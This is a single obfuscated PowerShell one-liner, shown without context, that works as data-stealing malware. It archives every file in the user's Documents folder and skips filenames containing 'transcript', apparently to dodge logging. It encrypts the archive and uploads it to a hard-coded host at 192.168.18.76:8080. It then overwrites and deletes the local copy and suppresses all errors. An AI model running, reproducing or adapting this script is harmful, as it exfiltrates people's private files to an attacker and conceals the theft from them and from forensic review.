$akgdsbnhjaf = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%^&()_+-=[]{}~'; $aadsfjkh = -join ((1..15) | ForEach { $akgdsbnhjaf[(Get-Random -Maximum $akgdsbnhjaf.Length)] }); $fnsdadkj = "$env:TEMP\$aadsfjkh.zip"; $cvmz = "$env:TEMP\$aadsfjkh.enc"; try { Get-ChildItem "$env:USERPROFILE\Documents" -Recurse -File | Where-Object { -not $_.PSIsContainer -and $_.Name -notlike "*transcript*" -and $_.Name -notlike "*.tmp" } | Compress-Archive -DestinationPath $fnsdadkj -CompressionLevel Fastest -ErrorAction SilentlyContinue; if (Test-Path $fnsdadkj) { $key = New-Object byte[] 16; $iv = New-Object byte[] 16; $zfsfdm = [System.Security.Cryptography.RNGCryptoServiceProvider]::Create(); $zfsfdm.GetBytes($key); $zfsfdm.GetBytes($iv); $zfsfdm.Dispose(); $aes = [System.Security.Cryptography.Aes]::Create(); $aes.Key = $key; $aes.IV = $iv; $encryptor = $aes.CreateEncryptor(); $dfnalkns = [System.IO.File]::ReadAllBytes($fnsdadkj); $encryptedBytes = $encryptor.TransformFinalBlock($dfnalkns, 0, $dfnalkns.Length); $aes.Dispose(); $combinedBytes = $key + $encryptedBytes + $iv; [System.IO.File]::WriteAllBytes($cvmz, $combinedBytes); Remove-Item $fnsdadkj -Force -ErrorAction SilentlyContinue; iwr -Uri "http://192.168.18.76:8080/upload" -Method Post -InFile $cvmz -ContentType "application/octet-stream" -Headers @{"X-Filename"=(Split-Path $cvmz -Leaf)} -ErrorAction SilentlyContinue | Out-Null; if (Test-Path $cvmz) { $fileSize = (Get-Item $cvmz).Length; $randomBytes = New-Object byte[] $fileSize; (New-Object System.Random).NextBytes($randomBytes); [System.IO.File]::WriteAllBytes($cvmz, $randomBytes); Remove-Item $cvmz -Force -ErrorAction SilentlyContinue } } } catch { }
